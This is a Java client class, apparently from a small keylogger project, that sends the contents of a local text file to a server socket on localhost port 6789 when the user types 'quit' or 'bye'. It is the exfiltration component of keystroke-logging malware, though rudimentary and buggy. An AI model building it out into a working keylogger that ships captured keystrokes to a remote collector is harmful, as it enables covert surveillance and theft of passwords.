package client;

import features.KeyLogger;
import features.KeyLoggerFile;

import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.util.concurrent.TimeUnit;

public class Client {

    public static void main(String[] argv) throws Exception {
        String sentence;
        // TODO: Transfer file from client to server.
        //File file;
        while (true) {
            Socket clientSocket = new Socket(InetAddress.getLocalHost(), 6789);
            BufferedReader inFromUser = new BufferedReader(new InputStreamReader(System.in));
//            DataOutputStream outToServer = new DataOutputStream(clientSocket.getOutputStream());

            sentence = inFromUser.readLine();
            //outToServer.writeBytes(sentence + '\n');
            if (sentence.equalsIgnoreCase("quit") || sentence.equalsIgnoreCase("bye")) {
                BufferedReader input = new BufferedReader(new FileReader("filename.txt"));

                String lines;
                while((lines = input.readLine()) != null){
                    DataOutputStream outToServer = new DataOutputStream(clientSocket.getOutputStream());
                    outToServer.writeBytes(lines);
                }
                // OutputStream outputStream =  clientSocket.getOutputStream();
                System.out.println("In 5 Seconds Client will disconnect.");
                TimeUnit.SECONDS.sleep(5);
                input.close();
                clientSocket.close();
                System.exit(0);
            }
        }
    }
}

